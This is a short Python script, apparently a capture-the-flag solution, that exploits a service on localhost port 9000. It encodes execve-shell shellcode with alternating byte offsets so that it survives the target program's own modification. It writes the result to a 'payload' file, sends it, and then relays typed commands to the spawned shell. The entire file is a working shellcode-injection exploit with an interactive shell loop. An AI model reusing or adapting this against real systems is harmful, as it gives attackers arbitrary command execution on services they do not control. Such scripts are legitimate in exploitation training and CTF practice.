import socket
import readline

host = '127.0.0.1'
port = 9000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None):
	res = s.recv(4096)
	print(res.decode('ascii'))
	return res

def send(data):
	data = data + b'\n' if data[-1] != b'\n' else data
	s.send(data)

def interact():
	for _ in range(100):
		cmd = input('> ').encode('ascii')
		send(cmd)
		recv(4096)

ori_shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
new_shellcode = b''

# The program will modified shellcode with 0, -1, +2, -3, +4...
for i in range(len(ori_shellcode)):
	offset = -i if i%2 == 0 else i
	c = (ori_shellcode[i] + offset) % 0x100
	new_shellcode += c.to_bytes(1, 'little')
	# new_shellcode += '\\x' + hex(c)[2:]
	# print(hex(ori_shellcode[i]), (offset), hex(c), new_shellcode)

print(new_shellcode.hex())
with open('payload', 'wb') as f:
	f.write(new_shellcode)

recv()
send(new_shellcode)
interact()
